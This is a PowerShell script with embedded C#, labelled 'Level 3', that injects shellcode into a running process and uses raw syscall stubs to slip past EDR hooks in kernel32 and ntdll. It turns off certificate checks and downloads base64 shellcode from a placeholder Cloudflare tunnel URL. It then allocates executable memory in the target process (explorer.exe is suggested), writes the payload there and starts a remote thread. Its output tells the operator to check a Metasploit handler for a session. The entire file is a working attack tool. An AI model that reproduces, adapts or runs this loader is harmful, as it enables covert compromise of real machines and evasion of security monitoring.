# ============================================================================
# LEVEL 3: DIRECT SYSCALL STUB INJECTION
# ============================================================================
# This goes DEEPER than syscall_v3.ps1!
# Instead of calling ntdll.dll functions, we emit raw syscall instructions
# directly in memory. This bypasses even EDRs that hook ntdll.dll!
#
# BYPASS CHAIN:
#   Level 1: kernel32.dll  → Sophos hooks here
#   Level 2: ntdll.dll     → Some EDRs hook here too  
#   Level 3: RAW SYSCALL   → WE ARE HERE! No DLL calls at all!
#
# ============================================================================

# Target process - Change this to your explorer.exe PID!
$TargetPID = 16248

# Shellcode URL
$ShellcodeURL = "https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=X7k9mP2vL4qR8nT1"

# Trust self-signed certificate
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ============================================================================
# SYSCALL NUMBERS (Windows 10 22H2 / Windows 11)
# These are the actual syscall numbers for x64 Windows
# ============================================================================
$NtAllocateVirtualMemory_Syscall = 0x18
$NtWriteVirtualMemory_Syscall = 0x3A
$NtCreateThreadEx_Syscall = 0xC1  # 0xC2 on some Win11 builds
$NtOpenProcess_Syscall = 0x26

# ============================================================================
# DIRECT SYSCALL IMPLEMENTATION
# ============================================================================
# We create executable memory, write syscall stubs there, then call them.
# This completely bypasses ntdll.dll - the syscall goes DIRECTLY to kernel!
# ============================================================================

$code = @'
using System;
using System.Runtime.InteropServices;

public class DirectSyscall {
    
    // We still need these for initial setup (allocating our stub memory)
    // But the actual injection uses raw syscalls!
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr h);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr addr, uint size, uint newProt, out uint oldProt);
    
    // Delegate types for our syscall stubs
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref uint RegionSize,
        uint AllocationType,
        uint Protect
    );
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtWriteVirtualMemoryDelegate(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        uint Size,
        ref uint Written
    );
    
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadExDelegate(
        ref IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        uint Flags,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr AttributeList
    );
    
    // Create a syscall stub in memory
    // This is the raw assembly that performs the syscall!
    public static IntPtr CreateSyscallStub(uint syscallNumber) {
        // x64 syscall stub:
        // mov r10, rcx      ; 4C 8B D1
        // mov eax, <num>    ; B8 XX XX XX XX
        // syscall           ; 0F 05
        // ret               ; C3
        
        byte[] stub = new byte[] {
            0x4C, 0x8B, 0xD1,                                     // mov r10, rcx
            0xB8, (byte)syscallNumber, (byte)(syscallNumber >> 8), 
                  (byte)(syscallNumber >> 16), (byte)(syscallNumber >> 24),  // mov eax, syscall#
            0x0F, 0x05,                                           // syscall
            0xC3                                                  // ret
        };
        
        // Allocate executable memory for our stub
        IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, 0x3000, 0x40);
        if (stubAddr == IntPtr.Zero) {
            throw new Exception("Failed to allocate memory for syscall stub");
        }
        
        // Copy stub to allocated memory
        Marshal.Copy(stub, 0, stubAddr, stub.Length);
        
        return stubAddr;
    }
    
    // Create NtAllocateVirtualMemory syscall
    public static NtAllocateVirtualMemoryDelegate GetNtAllocateVirtualMemory(uint syscallNum) {
        IntPtr stub = CreateSyscallStub(syscallNum);
        return Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(stub);
    }
    
    // Create NtWriteVirtualMemory syscall
    public static NtWriteVirtualMemoryDelegate GetNtWriteVirtualMemory(uint syscallNum) {
        IntPtr stub = CreateSyscallStub(syscallNum);
        return Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemoryDelegate>(stub);
    }
    
    // Create NtCreateThreadEx syscall
    public static NtCreateThreadExDelegate GetNtCreateThreadEx(uint syscallNum) {
        IntPtr stub = CreateSyscallStub(syscallNum);
        return Marshal.GetDelegateForFunctionPointer<NtCreateThreadExDelegate>(stub);
    }
}
'@

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  LEVEL 3: DIRECT SYSCALL INJECTION" -ForegroundColor Cyan
Write-Host "  Bypasses NTDLL.dll hooks!" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

# Compile the C# code
Write-Host "[*] Compiling direct syscall stubs..." -ForegroundColor Yellow
Add-Type -TypeDefinition $code

# Download shellcode
Write-Host "[*] Downloading shellcode from $ShellcodeURL..." -ForegroundColor Yellow
try {
    $b64 = (New-Object Net.WebClient).DownloadString($ShellcodeURL)
    $shellcode = [Convert]::FromBase64String($b64)
    Write-Host "[+] Downloaded $($shellcode.Length) bytes of shellcode" -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download shellcode: $_" -ForegroundColor Red
    exit
}

# Open target process (we still use kernel32 for this - less monitored)
Write-Host "[*] Opening process $TargetPID..." -ForegroundColor Yellow
$hProcess = [DirectSyscall]::OpenProcess(0x1F0FFF, $false, $TargetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "[-] Failed to open process $TargetPID" -ForegroundColor Red
    exit
}
Write-Host "[+] Got process handle: 0x$($hProcess.ToString('X'))" -ForegroundColor Green

# Create our direct syscall functions
Write-Host "[*] Creating direct syscall stubs (bypassing ntdll.dll)..." -ForegroundColor Yellow
$NtAllocate = [DirectSyscall]::GetNtAllocateVirtualMemory($NtAllocateVirtualMemory_Syscall)
$NtWrite = [DirectSyscall]::GetNtWriteVirtualMemory($NtWriteVirtualMemory_Syscall)
$NtCreateThread = [DirectSyscall]::GetNtCreateThreadEx($NtCreateThreadEx_Syscall)
Write-Host "[+] Syscall stubs created!" -ForegroundColor Green

# Allocate memory using DIRECT SYSCALL (not ntdll.dll!)
Write-Host "[*] Allocating memory via DIRECT SYSCALL (0x$($NtAllocateVirtualMemory_Syscall.ToString('X2')))..." -ForegroundColor Yellow
$remoteAddr = [IntPtr]::Zero
$regionSize = [uint32]$shellcode.Length

$status = $NtAllocate.Invoke(
    $hProcess,
    [ref]$remoteAddr,
    [IntPtr]::Zero,
    [ref]$regionSize,
    0x3000,  # MEM_COMMIT | MEM_RESERVE
    0x40     # PAGE_EXECUTE_READWRITE
)

if ($status -ne 0) {
    Write-Host "[-] NtAllocateVirtualMemory failed with status: 0x$($status.ToString('X8'))" -ForegroundColor Red
    [DirectSyscall]::CloseHandle($hProcess)
    exit
}
Write-Host "[+] Allocated $regionSize bytes at: 0x$($remoteAddr.ToString('X'))" -ForegroundColor Green

# Pin shellcode in memory and get pointer
$shellcodePtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
[Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodePtr, $shellcode.Length)

# Write shellcode using DIRECT SYSCALL
Write-Host "[*] Writing shellcode via DIRECT SYSCALL (0x$($NtWriteVirtualMemory_Syscall.ToString('X2')))..." -ForegroundColor Yellow
$bytesWritten = [uint32]0

$status = $NtWrite.Invoke(
    $hProcess,
    $remoteAddr,
    $shellcodePtr,
    [uint32]$shellcode.Length,
    [ref]$bytesWritten
)

if ($status -ne 0) {
    Write-Host "[-] NtWriteVirtualMemory failed with status: 0x$($status.ToString('X8'))" -ForegroundColor Red
    [DirectSyscall]::CloseHandle($hProcess)
    exit
}
Write-Host "[+] Wrote $bytesWritten bytes to remote process" -ForegroundColor Green

# Free local shellcode buffer
[Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodePtr)

# Create remote thread using DIRECT SYSCALL
Write-Host "[*] Creating thread via DIRECT SYSCALL (0x$($NtCreateThreadEx_Syscall.ToString('X2')))..." -ForegroundColor Yellow
$hThread = [IntPtr]::Zero

$status = $NtCreateThread.Invoke(
    [ref]$hThread,
    0x1FFFFF,        # THREAD_ALL_ACCESS
    [IntPtr]::Zero,  # ObjectAttributes
    $hProcess,       # ProcessHandle
    $remoteAddr,     # StartAddress (shellcode!)
    [IntPtr]::Zero,  # Parameter
    0,               # Flags (0 = run immediately)
    0,               # StackZeroBits
    0,               # SizeOfStackCommit
    0,               # SizeOfStackReserve
    [IntPtr]::Zero   # AttributeList
)

if ($status -ne 0) {
    Write-Host "[-] NtCreateThreadEx failed with status: 0x$($status.ToString('X8'))" -ForegroundColor Red
    [DirectSyscall]::CloseHandle($hProcess)
    exit
}

Write-Host "[+] Thread created! Handle: 0x$($hThread.ToString('X'))" -ForegroundColor Green
Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host "  INJECTION SUCCESSFUL!" -ForegroundColor Green
Write-Host "  Shellcode executing in PID $TargetPID" -ForegroundColor Green
Write-Host "  Check your MSF handler for session!" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green

# Cleanup
[DirectSyscall]::CloseHandle($hThread)
[DirectSyscall]::CloseHandle($hProcess)
